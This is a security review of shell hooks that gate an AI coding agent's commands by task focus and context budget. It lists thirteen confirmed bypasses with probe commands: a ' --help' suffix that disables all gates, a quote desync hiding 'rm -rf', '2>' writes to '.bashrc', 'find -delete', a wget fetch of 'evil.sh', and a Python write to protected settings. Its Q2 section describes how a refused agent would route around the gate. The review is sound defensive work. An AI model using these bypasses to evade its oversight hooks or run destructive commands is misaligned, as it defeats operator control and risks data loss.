# arc-012 ultrareview — W2: gates & safety

Reviewer: `arc012-w2-gates-safety` (worker 2 of 5)
Slice: `agents/context/budget-gate.sh`, `agents/context/check-active-task.sh`,
`agents/context/lib/safe-commands.sh`, `lib/context_tokens.py`
Branch: `arc012-ultrareview` (verified byte-identical to the working tree for all
four files, so every probe below ran against the branch under review).

**Method.** Every finding was reproduced by invoking the real hook or sourcing the
real predicate, with a matched negative control in each case. Probe scripts lived
in `/tmp`; no source file was modified. Two probe fixtures were used: the live
repo (focus = `T-3227`, so the drift gate is armed and provides a positive
control) and a synthetic project root at `/tmp/w2-fakeproj` with `current_task: ""`
(so the no-active-task gate is armed and `cp /etc/hosts /tmp/x` correctly returns
exit 2 as the negative control).

---

### F1. The universal `--help` / `--version` exemption short-circuits every gate on a substring match anywhere in the command

- **Severity:** critical
- **Confidence:** confirmed (traced and reproduced end-to-end)
- **Location:** `agents/context/check-active-task.sh:179`

```bash
if [[ "$BASH_CMD" =~ (^|[[:space:]])(--help|--version)([[:space:]]|$) ]]; then
    exit 0
fi
```

- **Failure scenario:** This test runs at line 179 — **before** `has_bash_write_pattern`
  (:220), before `is_bash_safe_command` (:223), before the no-active-task block
  (:550), before the stale-focus gate (:567), before the focus-drift gate (:624),
  before G-013 (:729), before the status gate (:747), before the onboarding and
  G-020 readiness gates. It matches the raw command string at any position,
  including inside a quoted argument or after a `#` comment. Reproduced against
  the live hook:

  | command | exit |
  |---|---|
  | `git commit -m "T-9999: unrelated work"` | **2** (focus-drift gate fires — positive control) |
  | `git commit -m "T-9999: unrelated work" --help` | **0** |
  | `cp /etc/hosts /tmp/w2copy` (focus null) | **2** (no-active-task — positive control) |
  | `cp /etc/hosts /tmp/w2copy # --help` (focus null) | **0** |
  | `sed -i s/a/b/ /etc/hosts # --help` | **0** |
  | `rm -rf /tmp/zz && echo --help` | **0** |

  Appending seven characters to any command makes the entire task gate disappear.
  A commit attributed to the wrong task, an in-place `sed` on a source file with
  no active task, and an `rm -rf` all pass.
- **Why it survives review:** the T-2410 rationale is genuinely reasonable — "any
  command with `--help` is read-only by convention" — and the comment explains why
  the match is unanchored ("Matches at any position so `cd … && fw upstream --help`
  is also exempt"). What it does not say is that the exemption is `exit 0`, not
  "skip the safe-list check", so the convention is being trusted to stand in for
  *eight* unrelated gates. It also predates the T-3221 fix in the same file, so it
  reads as settled rather than as an instance of the class T-3221 just closed.
- **Suggested fix:** apply the exemption per-clause via `_fw_chain_split` +
  `_fw_strip_quoted` (a `--help` token must survive quote-stripping and be in the
  *same* clause as its command), and demote it from `exit 0` to "treat this clause
  as safe-listed" so it feeds `is_bash_safe_command` instead of replacing the
  whole file.

---

### F2. The task-bootstrap exemption matches inside quoted payloads, and its quote-stripper is the naive form `_fw_strip_quoted` exists to replace

- **Severity:** high
- **Confidence:** confirmed (reproduced end-to-end, matched pair)
- **Location:** `agents/context/check-active-task.sh:212` (regex), `:213` (stripper)

```bash
if [[ "$BASH_CMD" =~ (^|[[:space:]]|/)fw[[:space:]]+(work-on|task[[:space:]]+create|context[[:space:]]+focus|inception)([[:space:]]|$) ]]; then
    _bootstrap_unquoted=$(printf '%s' "$BASH_CMD" | sed "s/'[^']*'//g; s/\"[^\"]*\"//g")
    if ! { type has_bash_write_pattern &>/dev/null && has_bash_write_pattern "$_bootstrap_unquoted"; }; then
        exit 0
    fi
fi
```

Two independent defects in five lines.

- **Failure scenario (a) — substring match, drift gate skipped.**
  `git commit -m "T-9999: note that fw work-on sets focus"` with focus on
  `T-3227`. The regex matches the ` fw work-on ` inside the commit *message*;
  the stripper removes the quoted span leaving `git commit -m `, which has no
  write pattern; **exit 0** at line 212 — 412 lines before the focus-drift gate.
  Measured: the same command without the words is exit 2. This is exactly the
  T-3221 defect ("a MENTION of the string rather than a command in command
  position") in the branch immediately above the two that T-3221 fixed.

- **Failure scenario (b) — quote desync hides a write pattern.**
  `sed "s/'[^']*'//g; s/\"[^\"]*\"//g"` pairs quote characters *independently*,
  which is the precise defect `_fw_strip_quoted` was written for — see
  `safe-commands.sh:942`: *"A regex that strips `'[^']*'` and `"[^"]*"`
  independently pairs an apostrophe inside a double-quoted string with the next
  unrelated quote and desyncs everything after it."* The sibling function was
  fixed; this call site still uses the broken form. Matched pair, live hook,
  focus null:

  | command | stripped view | exit |
  |---|---|---|
  | `fw work-on "user task" && rm -rf /tmp/w2x && grep 'foo' .` | `fw work-on  && rm -rf /tmp/w2x && grep  .` | **2** |
  | `fw work-on "user's task" && rm -rf /tmp/w2x && grep 'foo' .` | `fw work-on "userfoo' .` | **0** |

  One apostrophe in a task name flips the verdict on a line containing
  `rm -rf`. The apostrophe in `user's` pairs with the opening `'` of `'foo'`,
  and the entire `&& rm -rf /tmp/w2x &&` span is swallowed before
  `has_bash_write_pattern` ever sees it.

- **Why it survives review:** the T-2936 comment above this block is long,
  specific, and argues correctly that *both failure directions of the stripper
  are safe* — "under-stripping leaves the metacharacter and blocks; an unbalanced
  quote fails to match the strip pattern at all and also blocks". Both claims are
  true of a *correct* stripper. Neither is true of a desyncing one, which
  over-strips: it removes text that was never quoted. The argument is sound and
  applied to the wrong function.
- **Suggested fix:** replace the inline `sed` with `_fw_strip_quoted` (which
  returns non-zero on an unbalanced quote, giving the fail-to-blocking the comment
  claims), and require the bootstrap verb to appear in *command position* of some
  clause — i.e. run the regex over `_fw_chain_split` segments after quote-stripping,
  not over the raw string.

---

### F3. The budget gauge writes an affirmative `level: ok` that it never measured, and caches it

- **Severity:** high
- **Confidence:** confirmed (reproduced end-to-end, matched pair)
- **Location:** `lib/context_tokens.py:97`, consumed at `agents/context/budget-gate.sh:365-379`

```python
# Fail-open, not fail-guess: too few entries to trust a scope decision.
if len(in_scope) < 2:
    return (0, "")
```

```bash
TOKENS=$(tail -c 10000000 "$TRANSCRIPT" 2>/dev/null | python3 "$FRAMEWORK_ROOT/lib/context_tokens.py" "$SESSION_START_TS" 2>/dev/null)
[[ "$TOKENS" =~ ^[0-9]+$ ]] || TOKENS=0
LEVEL="ok"; if [ "$TOKENS" -ge "$TOKEN_CRITICAL" ]; then LEVEL="critical" ...
printf '{"level": "%s", "tokens": %d, ...}' "$LEVEL" "$TOKENS" ... > "$STATUS_FILE"
```

- **Failure scenario:** a transcript whose in-scope set contains exactly one usage
  entry, of 290,000 tokens (above `TOKEN_CRITICAL` = 285,000). Measured against
  the real `budget-gate.sh` with `CONTEXT_DIR` pointed at a scratch dir:

  | transcript | exit | `.budget-status` written | stderr |
  |---|---|---|---|
  | 1 entry, 290,000 tokens | **0** | `{"level":"ok","tokens":0,…}` | **0 bytes** |
  | 2 entries, 10 + 290,000 tokens | 2 | `{"level":"critical","tokens":290000,…}` + `.restart-requested` | full banner |

  The gate does not merely fail open — it records a positive "ok" verdict in the
  cache, which the fast path then trusts for `STATUS_MAX_AGE` (90 s) on every
  subsequent tool call without re-reading anything. Nothing in the status file
  distinguishes *measured 0* from *could not measure*. The identical outcome
  occurs when the module returns 0 for any other reason (unparseable JSONL, all
  entries filtered by `session_start_ts`) and when `python3` fails outright —
  stderr is discarded by `2>/dev/null` and the regex guard on :366 converts the
  empty string into the number zero.

  This is reachable in exactly the state this arc creates. A `compact_boundary`
  resets `entries = []`; `session_start_ts` filtering can do the same. The first
  slow-path check after each auto-restart iteration therefore sees one entry — and
  the entry immediately after a boundary is the one carrying the *largest*
  re-injected prompt. It self-corrects on the next entry, so the blind window is
  short, but it is the first check of every loop iteration and it is completely
  silent.
- **Why it survives review:** the module's docstring names the behaviour honestly
  ("Fail-open, not fail-guess") and justifies it with a claim that reads as
  obviously true: *"a session that young cannot have filled its context."* The
  gate never verifies youth; it infers it from an entry **count**. That is the
  T-3209 shape — inferring a cause from an absence — and the 290,000-token
  single-entry input falsifies it directly. The choice is also defensible *inside*
  the module; the defect only appears at the join, where the caller cannot tell
  `0` from `unknown`.
- **Suggested fix:** return a distinguishable sentinel (`None`, or `-1`) for
  "could not measure", and have `budget-gate.sh` write `"level":"unknown"` with a
  `"reason"` field rather than `"ok"` — an unknown level already falls through to
  the slow path on the next call, so no new control flow is needed. At minimum
  emit one stderr line, the way `_classifier_notice` (T-2919) already does for the
  sibling case: *"a verdict must not print without saying what it was based on."*

---

### F4. `wget URL` writes a file with no flag at all; the T-3222 fix only looks for `-O`

- **Severity:** high
- **Confidence:** confirmed (probed against `is_bash_safe_command` and the live hook)
- **Location:** `agents/context/lib/safe-commands.sh:699` (`curl|wget)` arm), `:872` (`_fw_fetch_writes_file`)

- **Failure scenario:** with no active task, `wget https://example.test/evil.sh`
  is admitted. `_fw_fetch_writes_file` tokenises the clause, finds no token
  matching an output flag, and returns 1 ("does not write") — so the arm returns 0
  (safe) and `check-active-task.sh` exits 0. But bare `wget URL` **saves the
  response to a file in the cwd named after the URL**; writing to stdout is the
  flagged, non-default behaviour (`-O -`). curl is the opposite — stdout by
  default, file only on `-o`. The fix treats the two symmetrically:

  > "`curl -o FILE` and `wget -O FILE` write a file with no redirect … The
  > destination is the hazard, not the flag."

  The destination is indeed the hazard, which is why wget needs no flag to be one.
  The same tokeniser misses several genuine curl write flags, all confirmed
  admitted with no active task:

  | command | verdict | writes |
  |---|---|---|
  | `wget https://example.test/evil.sh` | SAFE | `./evil.sh` |
  | `wget -q https://example.test/evil.sh` | SAFE | `./evil.sh` |
  | `curl -D /tmp/hdr https://example.test/` | SAFE | `/tmp/hdr` (`--dump-header`) |
  | `curl --cookie-jar /tmp/jar https://example.test/` | SAFE | `/tmp/jar` |
  | `curl --trace-ascii /tmp/trace https://example.test/` | SAFE | `/tmp/trace` |
  | `curl -o /tmp/x https://example.test/` | UNSAFE ✓ | (correctly gated) |
  | `wget -O /tmp/x https://example.test/` | UNSAFE ✓ | (correctly gated) |

  `--*) continue` (:893) is the catch-all that lets every long-form curl output
  option through; `-c`, `-D`, `-K` are missed by the short-flag cluster test,
  which only inspects the letters `O` and `o`.
- **Why it survives review:** the fix is careful, well-tested on the shapes it
  targets, and its comment states an admission rule that sounds complete ("only
  verbs that cannot write a file WITHOUT a shell redirect"). The parallel
  construction `curl -o` / `wget -O` makes the two tools look like mirror images,
  which is the one thing they are not.
- **Suggested fix:** treat `wget` as **always writing** unless an explicit
  `-O -` / `--output-document=-` is present (invert the default for that base),
  and add the curl file-producing options `-D/--dump-header`, `-c/--cookie-jar`,
  `--trace`, `--trace-ascii`, `--stderr` to the write set. Consider replacing the
  `--*) continue` catch-all with an allowlist of known-read-only long options, so
  the failure direction on an unrecognised flag is *blocking*, which is what the
  function's own header comment promises.

---

### F5. `2>FILE` is a real file write that `has_bash_write_pattern` deliberately excludes

- **Severity:** high
- **Confidence:** confirmed (probed against the predicate and the live hook)
- **Location:** `agents/context/lib/safe-commands.sh:782`

```bash
if echo "$cmd" | grep -qE '[^2>&]>[^>&]|>>'; then
```

- **Failure scenario:** with no active task, `ls -la 2>/tmp/w2-pwned` returns
  exit 0 from `check-active-task.sh` and creates/truncates `/tmp/w2-pwned`.
  Substitute any path: `cat /etc/hostname 2>/root/.bashrc` truncates `.bashrc`.
  Both confirmed SAFE by `is_bash_safe_command` and exit 0 through the hook with
  focus null (control: `cp /etc/hosts /tmp/w2copy` → exit 2).

  The `2` in the negated class `[^2>&]` is **redundant for its stated purpose**.
  `2>&1` is already excluded by the right-hand `[^>&]` (the character after `>`
  is `&`). Removing `2` from the left-hand class would still not match `2>&1`.
  So the `2` exclusion admits exactly one thing: `2>FILE`, a genuine write.

  This also weakens the guarantee T-3221 just added. `is_commit_checkpoint_command`
  calls `has_bash_write_pattern "$cmd" && return 1` at `:987`, with the comment
  *"This is also what makes the T-3179 block message's claim that 'write patterns
  void the allowance' true; it was not before."* Confirmed counter-example:
  `git commit -m "T-1: x" 2>/tmp/log` → `write=no`, `commit-checkpoint=YES`. The
  claim is still only mostly true.

  Related blind spot in the same regex: bash's `&>FILE` form is also not matched
  (the `>` is preceded by `&`). It happens to be caught downstream by an accident
  of base-name extraction (`_fw_chain_split` splits on the `&`, and the residual
  `>file` segment extracts a base that matches no arm), not by the write detector.
  That is luck, not coverage — the same "correctness was punctuation luck" the
  T-3221 comment identifies at `:832`.
- **Why it survives review:** the comment on the arm ("but not comparison
  operators like `2>&1`") states an intent that is correct, and the regex
  *appears* to implement it. Reading the negated class as a unit hides that one of
  its three members is doing nothing for the stated goal and everything for an
  unstated hole.
- **Suggested fix:** drop `2` from the negated class — `[^>&]>[^>&]|>>` still
  excludes `2>&1`, `>&2` and `>&-` while catching `2>FILE`. Add `&>` explicitly.

---

### F6. `find` is unconditionally safe-listed, and `find -delete` / `-exec` are not write patterns

- **Severity:** high
- **Confidence:** confirmed (probed against the predicate and the live hook)
- **Location:** `agents/context/lib/safe-commands.sh:371`

```bash
# Category 3: Searching
grep|rg|find|which|where|type|command)
    return 0
```

- **Failure scenario:** with no active task, `find . -name "*.zzz" -delete`
  returns exit 0 through `check-active-task.sh` (confirmed; control `cp` → exit 2).
  Substitute `-name "*.md"` and it deletes every markdown file under the cwd —
  including `.tasks/active/*.md` if run from the project root. `find . -name x
  -exec mv {} /tmp \;` is likewise SAFE. `has_bash_write_pattern` catches only
  `rm|rmdir`, so `-delete`, `-exec mv`, `-exec chmod`, `-exec truncate`,
  `-exec install` all pass. The wrapper stripper (T-3096) extends the reach:
  `timeout 30 find . -delete` and `env -i find . -delete` strip to the same
  command and classify identically.
- **Why it survives review:** `find` sits in a category literally named
  "Searching", next to `grep` and `rg`, and its overwhelmingly common use is a
  search. The category header asserts a property of the *category*, not of the
  verb, and `find` is the one member that has an execute-and-mutate mode built in
  — structurally the same problem the file already solved for `git config`,
  `git symbolic-ref`, `sed -i`, `yq -i` and `ip link set`, each of which is
  excluded or verb-scoped with a written rationale. `find` was not put through
  that same test.
- **Suggested fix:** keep `find` safe-listed but refuse the clause when it
  contains `-delete`, `-exec`, `-execdir`, `-ok`, `-okdir`, or `-fls/-fprint*`
  — the same treatment `sed -i` already receives via a dedicated rule at `:787`.

---

### F7. The `python3 -c` write-indicator regex misses the modern write APIs — including one that defeats B-005

- **Severity:** high
- **Confidence:** confirmed (probed against the predicate)
- **Location:** `agents/context/lib/safe-commands.sh:708-717`

```bash
if echo "$cmd" | grep -qE "(open\(.*, *['\"]w|\.write\(|shutil\.|os\.(rename|remove|unlink|makedirs|system))"; then
    return 1
fi
return 0
```

- **Failure scenario:**

  ```
  python3 -c "import pathlib;pathlib.Path('.claude/settings.json').write_text('{}')"
  ```

  Measured: `write=no`, `safelisted=YES`. `.write_text(` does not match `\.write\(`
  (the regex requires `(` immediately after `write`); there is no `open(`, no
  `shutil.`, no listed `os.` call, no redirect, no `rm`. The command is admitted
  with no active task **and it overwrites `.claude/settings.json`** — the file
  that B-005, enforced 200 lines away in the same hook
  (`check-active-task.sh:392-437`), exists to protect from agent modification.
  The Write/Edit route to that file is blocked with a nine-paragraph refusal; the
  Bash route is on the read-only allowlist.

  Other misses in the same class, all confirmed SAFE: `os.replace`, `os.rmdir`,
  `os.truncate`, `Path.unlink()`, `Path.write_bytes()`, append mode
  `open(p,'a')` (the regex only looks for `'w`), and `open(p, mode)` where the
  mode is a variable.
- **Why it survives review:** the list reads as a reasonable enumeration of "how
  Python writes files", and `.write(` looks like it covers the `write_*` family.
  It was written against `open()`-era idioms and never revisited against
  `pathlib`, which is now the idiomatic form. The failure direction is also
  invisible: an admitted command produces no gate output at all.
- **Suggested fix:** invert the test. Rather than enumerating write verbs,
  refuse `python3 -c` unless the script matches a narrow read-only shape
  (`yaml.safe_load`/`json.load` + `print`), which is the actual documented use
  case ("Only safe if it's a parse/check command"). Failing that, at minimum add
  `\.write_(text|bytes)\(`, `\.unlink\(`, `os\.(replace|rmdir|truncate|popen)`,
  `subprocess\.`, and `open\(.*,\s*['\"][wax]`.

---

### F8. budget-gate never names the model its cap applies to, although T-3204 built exactly that capability

- **Severity:** medium
- **Confidence:** confirmed (traced both call sites)
- **Location:** `agents/context/budget-gate.sh:365`; `lib/context_tokens.py:42-51`

- **Failure scenario:** `compute_context_tokens_detail` returns
  `(tokens, dominant_model)` specifically because "the gauges that consume this
  module apply a CONFIGURED BUDGET CAP … and could not previously say which model
  the cap was being applied to." Repo-wide, `--with-model` has exactly one
  consumer: `agents/context/checkpoint.sh:455`. `budget-gate.sh:365` calls the
  module **without** the flag, so every message it emits — the warn line, the
  urgent line, and the whole `SESSION WRAPPING UP` banner — still says only
  "the 300000-token budget cap" with no model named.

  That is the wrong half to have shipped. This file's own T-2403 comment
  establishes that at critical, checkpoint.sh **cannot run**: *"general tools are
  blocked here (exit 2) → their PostToolUse never fires → checkpoint never writes
  the signal."* So the only surface that names the model is the one that is
  structurally silent at the moment the model matters. Concretely on this host:
  the session is `claude-opus-5` with a 1M window, the gauge reads 168,626
  tokens, and the gate reports "~56% of the 300000-token budget cap" — a true
  statement about a policy dial that an operator reading it unattended has no way
  to relate to the 17% of real capacity it represents.
- **Why it survives review:** the reader-facing half of T-3204 — reframing
  "~95% of context window" as "~95% of the configured budget cap" — *was* done,
  thoroughly and in every message. That fix is visible on every line, so the
  section looks complete; the missing piece is a flag that is absent rather than
  wrong.
- **Suggested fix:** call the module with `--with-model` in `budget-gate.sh`,
  split the tab-separated output (keeping the bare-integer fallback the module's
  `main()` comment insists on), and append `(model: <name>)` to the warn/urgent/
  critical lines. Persist the model in `.budget-status` so the fast path can
  print it too.

---

### F9. The transcript fallback selects the globally-newest JSONL, which under this arc's own dispatch model can be another session's

- **Severity:** medium
- **Confidence:** confirmed behaviour; reachability of the fallback is plausible
- **Location:** `agents/context/budget-gate.sh:343-347`

```bash
TRANSCRIPT=$(
    while IFS= read -r d; do
        find "$d" -maxdepth 1 -name "*.jsonl" -type f ! -name "agent-*" -print0 2>/dev/null
    done < <(fw_claude_project_dirs) | xargs -r -0 ls -t 2>/dev/null | head -1
)
```

- **Failure scenario:** when stdin carries no usable `transcript_path`, the gate
  picks whichever transcript in the candidate project dirs was written most
  recently — with no check that it belongs to the calling session. Measured: a
  stdin payload with `transcript_path` pointing at a non-existent file caused the
  gate to fall through to this branch and report 178,981 tokens, which is *this
  reviewer session's* live transcript, not the caller's.

  This arc actively creates the colliding condition. Five parallel review workers
  plus a parent are running in `-opt-999-Agentic-Engineering-Framework` right now;
  `fw reviewer --dispatch`, `fw termlink dispatch` and the sub-agent protocol all
  put several concurrent sessions in one project dir. `ls -t | head -1` then
  resolves to whichever wrote last. A worker at 20K tokens hands the parent an
  "ok" while the parent sits at 290K — the loop never arms — or the reverse, and a
  worker is blocked and restarted on the parent's budget.

  This is the T-2885 / 832-T-401 poisoning class one layer up: T-2885 fixed
  *cross-model* poisoning **within** one transcript; *cross-session* poisoning at
  transcript **selection** is unaddressed.
- **Why it survives review:** the T-2392 comment justifies the multi-dir search
  convincingly and against a real bug (worktree blindness), and "globally-newest"
  is the right tiebreak for the single-session case it was written for. The
  primary path (stdin `transcript_path`, T-2377) is correct and is what normally
  runs, so the fallback is rarely exercised and never in a multi-session test.
- **Suggested fix:** when falling back, filter candidates by session id — the
  gate already reads `session.yaml` in `_write_restart_signal` — or refuse to
  guess when more than one candidate has been modified in the last few minutes,
  writing `"level":"unknown"` rather than a measurement attributed to the wrong
  conversation (see F3).

---

### F10. `FW_CONTEXT_WINDOW=0` is accepted as valid and turns the gate into a permanent-critical restart loop

- **Severity:** medium
- **Confidence:** confirmed (probed `fw_config_int` and the arithmetic behaviour)
- **Location:** `agents/context/budget-gate.sh:107-112`; `lib/config.sh:158`

- **Failure scenario:** `fw_config_int` validates against `^[0-9]+$` and its own
  error text says "must be a non-negative integer" — so `0` passes. With
  `CONTEXT_WINDOW=0`: `TOKEN_WARN`, `TOKEN_URGENT` and `TOKEN_CRITICAL` are all
  `0`, so `[ "$TOKENS" -ge 0 ]` is always true and **every** invocation is
  critical. Every percentage expression `$((TOKENS * 100 / CONTEXT_WINDOW))`
  raises `division by 0` on stderr and expands to nothing, so the banner reads
  "Context is at ~%." Verified in script context that this does **not** abort the
  script (no `errexit`), so control reaches `exit 2` and `_write_restart_signal`
  fires — on every tool call. In an unattended run the result is a session that
  blocks every non-wrap-up call from its first tool use and re-arms the restart
  signal continuously.

  Non-numeric and unset values are handled correctly (fall back to 300000, with a
  warning). `fw doctor` only WARNs on `cw < 50000` (`bin/fw:3257`) — advisory, in
  a command nothing runs unattended, inside a section that only renders when
  config overrides exist.
- **Why it survives review:** `fw_config_int`'s contract is "non-negative
  integer" and 0 satisfies it literally; the bug is that the *caller's* valid
  domain is "positive", and no caller says so. The failure is also loud in the
  wrong way — it produces noise (a division error) rather than a diagnosis.
- **Suggested fix:** clamp in `budget-gate.sh` — `[ "$CONTEXT_WINDOW" -lt 1000 ]
  && CONTEXT_WINDOW=300000` with one stderr line naming the override — or add a
  `fw_config_positive_int` helper and use it for this key.

---

### F11. Dominant-model-by-count can be inverted by a few small foreign entries

- **Severity:** low
- **Confidence:** plausible — behaviour confirmed with a synthetic input; I could
  not reproduce the *shape* in this repo's real transcripts
- **Location:** `lib/context_tokens.py:92-94`

- **Failure scenario:** the scope decision is `Counter(...).most_common(1)` over
  entry **count**. Fed 2 own-model entries of 295,000 and 298,000 tokens and 3
  foreign entries of 900 each, the module returns `900  claude-haiku-4-5` —
  a 298K conversation gauged at 900 tokens, so `LEVEL=ok` and the loop never arms.
  T-2885 replaced "newest entry wins" with "most entries win"; both are positional
  proxies for authorship, and the second is only harder to invert, not immune.
- **Why it survives review:** the docstring's reasoning is empirically sound for
  the attack it was built against — a lone cache-priming call cannot out-count a
  conversation. It is only wrong for a *burst* of foreign entries immediately
  after a `compact_boundary` resets the counter.
- **What I checked, and why this is not rated higher:** I scanned the three most
  recent transcripts in `~/.claude/projects/-opt-999-Agentic-Engineering-Framework`
  (48, 82 and 41 usage entries). Every entry in all three is `claude-opus-5` and
  `isSidechain` is `false` throughout — sub-agent turns do **not** land in the
  main transcript in this environment, and no second model appears. So the
  inverting shape is constructible but I have no evidence it occurs here.
- **Suggested fix:** if a cheap authorship signal exists in the entry (a session
  id, `isSidechain`, a `parentUuid` chain), scope on that instead of on a count.
  Otherwise, prefer the *maximum* in-scope total over the last, or refuse when no
  model holds a clear majority.

---

### F12. A `.budget-status` timestamp in the future pins the gate to whatever level it last recorded

- **Severity:** low
- **Confidence:** confirmed (by reading; the arithmetic is unambiguous)
- **Location:** `agents/context/budget-gate.sh:150`, `:248`

- **Failure scenario:** `age = int(time.time()) - s.get('timestamp', 0)`, and the
  freshness test is `[ "${STATUS_AGE}" -lt "$STATUS_MAX_AGE" ]`. If the wall clock
  steps **backwards** — an NTP correction, a VM or container resume, a host clock
  fix — `age` goes negative and stays negative until the clock catches up. A
  negative age satisfies `-lt 90`, so the fast path is taken on every call and the
  slow path never re-reads the transcript. If the pinned level is `ok`, the budget
  gate is silently off for the duration of the skew. The T-271 guard
  (`FORCE_RECHECK`, `:302`) covers only the stale-**forward** direction, and only
  for `critical`.
- **Why it survives review:** the T-271 comment describes the trap it fixed in
  detail and reads as an exhaustive treatment of staleness. A negative age is not
  "stale", so it never came up.
- **Suggested fix:** treat `age < 0` as stale — `[ "$STATUS_AGE" -ge 0 ] && [ "$STATUS_AGE" -lt "$STATUS_MAX_AGE" ]`.

---

### F13. A failed restart-signal write is fully swallowed while the banner still announces wrap-up

- **Severity:** low
- **Confidence:** plausible — the swallow is confirmed by reading; I could not
  produce a failing write (the probe ran as root, which ignores mode bits)
- **Location:** `agents/context/budget-gate.sh:53-83`

- **Failure scenario:** the entire body of `_write_restart_signal` is wrapped in
  `{ … } 2>/dev/null || true`. On `ENOSPC`, a read-only `.context`, or a
  restrictive umask on `.context/working/`, `.restart-requested` is not created
  and nothing says so — the gate still prints the full `SESSION WRAPPING UP`
  banner and exits 2, so the agent and the operator both see a session that
  appears to be handing off. In an unattended run the terminator then waits on a
  file that will never appear, which is the exact dead-lock the T-2403 comment
  says this function exists to prevent.
- **Why it survives review:** the swallow is deliberate and correctly argued —
  "this hook gates EVERY tool call, and a non-zero/partial failure here would
  block all tools." That argument justifies not *failing*; it does not justify not
  *reporting*.
- **Suggested fix:** keep the swallow, add one line — after the block, `[ -f
  "$restart_signal" ] || echo "  ⚠ could not write .restart-requested — the
  auto-restart loop will NOT fire." >&2`, alongside the existing
  `_supervision_notice`, which already handles the sibling disarm condition
  (T-2499) loudly.

---

## Q2 — the inverse failure: how often is a genuine read refused, and where does the agent go next?

**Assessed, and it is a real and frequent cost.** The gate's recognition rule is
"first word of every chain segment, after prefix stripping, must match an arm."
Anything whose first word is a *shell construct* rather than a command is
therefore unrecognisable in principle. Confirmed refusals of plainly read-only
work:

- **Variable assignment with command substitution** — the orchestrator's own case,
  `f=$(ls .tasks/active/T-3227-*.md); sed -n … "$f"`. The T-1908 env-prefix
  stripper consumes `f=$(ls` as the assignment and hands the judge
  `.tasks/active/T-3227-*.md)`, whose base is `T-3227-*.md`. No arm matches.
- **Every compound shell construct** — `for f in *; do cat "$f"; done`,
  `if [ -f x ]; then cat x; fi`, `while read -r l; do echo "$l"; done`. The `;`
  splits produce segments beginning with `do`, `then`, `fi`, `done`, none of which
  is a command.
- **Any `$(…)` in a non-allowlisted position**, per the splitter's stated
  non-goal at `:51`.
- **Running the project's own tests** — `bats tests/unit/x.bats`,
  `python3 script.py`, `./x.sh status` — excluded on the Tier-0 scope boundary.
  Correct in principle, but this is the single most common shape an agent needs
  during verification.

The gate is honest about all of these: `_bash_gate_reason` (T-3096) names the
offending segment and says "this command writes nothing the gate can detect …
is not on the read-only allowlist", which is a genuine improvement and the reason
the orchestrator understood the refusal instead of thrashing.

**The realistic next move is the problem.** These refusals only bind when focus is
null, stale, or completed — recovery states, where friction is highest and the
agent is most motivated to route around. The four workarounds available are, in
ascending order of what an agent will actually try:

1. Split the pipeline into separate tool calls — inside the gate, correct, and
   what a careful agent does.
2. `fw work-on` something to establish focus — inside the gate, and the
   sanctioned path.
3. `FW_SAFE_MODE=1 <cmd>` — **inert**, per CLAUDE.md §Configuration (T-3179): the
   hook reads its own process environment, never the command string. The agent
   tries it, stays blocked, and learns nothing about why.
4. **Append ` --help` (F1)** — outside the gate, entirely. It is one token, it is
   documented in a comment as a legitimate convention, it is the first thing a
   command-line agent reaches for when a command is refused, and it silently
   disables all eight gates for that call.

That adjacency is the finding worth acting on: a gate that refuses ordinary reads
sits immediately next to a seven-character total bypass that an agent will
plausibly discover by accident while trying to comply. F1's severity is set by
F5's frequency, not on its own.

---

## Q5 — false-green sweep: named inputs

Every check in the four files, and whether it can report OK without testing its
subject:

| Check | Can it report OK vacuously? | Input |
|---|---|---|
| `compute_context_tokens_detail` | **Yes** | 1 in-scope usage entry of 290,000 tokens → returns `0` → gate writes `level: ok` (F3) |
| `budget-gate` `TOKENS` guard `:366` | **Yes** | any `python3` failure → empty → `0` → `level: ok`, stderr discarded (F3) |
| `budget-gate` transcript resolution | **Yes** | no usable `transcript_path` and a concurrent session → measures the wrong conversation (F9); no transcript at all → `exit 0`, zero stderr (`:350`) |
| `budget-gate` fast-path freshness | **Yes** | `.budget-status` timestamp in the future → pinned to its last level (F12) |
| `_write_restart_signal` | **Yes** | unwritable `.context/working/` → banner prints, signal absent, no notice (F13) |
| `has_bash_write_pattern` | **Yes** | `ls -la 2>/tmp/x` and `cmd &>/tmp/x` → "no write" on a real write (F5) |
| `_fw_fetch_writes_file` | **Yes** | `wget https://host/f`, `curl -D /tmp/h URL` → "does not write" (F4) |
| `is_bash_safe_command` (`find` arm) | **Yes** | `find . -name '*.md' -delete` → SAFE (F6) |
| `is_bash_safe_command` (`python3 -c` arm) | **Yes** | `pathlib.Path(p).write_text(s)` → SAFE (F7) |
| `is_commit_checkpoint_command` | **Partly** | `git commit -m "T-1: x" 2>/tmp/log` → admitted despite a write (F5); otherwise held up well under probing — `$(…)`/backticks, `--no-verify`, `; rm -rf`, `\| tee f` and the quoted-mention case were all correctly refused |
| `check-active-task` `--help` exemption | **Yes** | ` --help` anywhere, including in a quoted string or after `#` (F1) |
| `check-active-task` bootstrap exemption | **Yes** | ` fw work-on ` inside a commit message; an apostrophe that desyncs the stripper (F2) |
| `_fw_chain_split` | No | probed with quoted `&&`, embedded newlines, `2>&1`, `>&2`, `>& file` — all handled as documented |
| `_fw_strip_quoted` | No | returns non-zero on an unbalanced quote; callers block. Correct |
| `_fw_single_command_is_safe` wrapper stripper | No | every unrecognised shape leaves `cmd` untouched, so the base stays the wrapper name and gates. Verified with `timeout`, `env -i`, `nice -n`, `flock -n`, bare wrappers |
| `_fw_extract_drift_target` | No new cases | the two residual quote-nesting limits are already documented at `:119` and `:142`; I found no third |
| `_bash_gate_reason` | No | only runs when `has_bash_write_pattern` is false; degrades to a generic message if the library failed to source |
| `_supervision_notice` | No | tests an env var directly; no proxy |

**Where I looked and found nothing:** the `git` sub-verb table (`:326-360`) — I
checked `config`, `symbolic-ref`, `pull`, `checkout`, `restore`, `clean`, `gc`,
`update-ref`, `apply`, `am`, `filter-branch`; none is present and the exclusions
of `config`/`symbolic-ref` are correctly reasoned. The `fw` sub-verb table
(`:491-682`) — I spot-checked the MIXED verbs the T-3096 comment claims to
exclude (`reviewer` bare form, `outcome backprop`, `orchestrator improve`,
`upstream pin/set/sync`, `integrate run`); the exclusions are real and
`integrate`'s deliberate whole-verb allow is argued. The `termlink` and
`systemctl` verb splits match the read/write boundary they claim. Argument-order
handling in `_fw_fetch_writes_file` is correct in both directions
(`curl -o out URL` and `curl URL -o out` both classify as writes), as is
short-flag bundling (`-sO`, `-so out`, `-o-`, `-O -`).

---

## Verdict

**Counts by severity:** 1 critical · 6 high · 3 medium · 3 low = **13 findings**.

The four files are, on the whole, unusually well-reasoned code — the comments
carry measured evidence, name their origin incidents, and argue failure direction
